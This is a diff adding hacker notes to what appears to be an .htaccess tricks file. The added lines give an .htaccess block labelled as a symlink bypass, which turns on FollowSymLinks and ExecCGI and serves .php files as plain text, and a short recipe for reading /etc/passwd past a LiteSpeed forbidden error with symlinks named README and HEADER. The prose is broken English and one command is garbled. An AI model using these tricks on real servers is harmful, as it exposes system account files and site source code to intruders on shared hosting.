@@ -49,3 +49,36 @@ AddType text/plain .html
 AddHandler txt .html
 Require None
 Satisfy Any
+
+
+Bypass symlink via .htaccess
+
+OPTIONS Indexes Includes ExecCGI FollowSymLinks
+AddHandler txt .php
+AddHandler cgi-script .cgi
+AddHandler cgi-script .pl
+OPTIONS Indexes Includes ExecCGI FollowSymLinks
+Options Indexes FollowSymLinks
+AddType txt .php
+AddType text/html .shtml
+Options All
+Options All
+
+
+bypass passwd in LiteSpeed 
+
+A good way to bypass forbidden error when reading passwd file
+The general approach:
+
+
+ln -s / etc / passwd passwd.txt
+
+Well, open the passwd file The forbidden error encountered
+for bypass=>
+
+To bypass coming from one of the following two commands are used:
+Code: (Select All)
+ln -s /etc/passwd README
+ln -s /etc/passwd HEADER
+The second command will run in a directory And when we go back to the directory where the file will be shown passwd us.
+SPT to b0x 
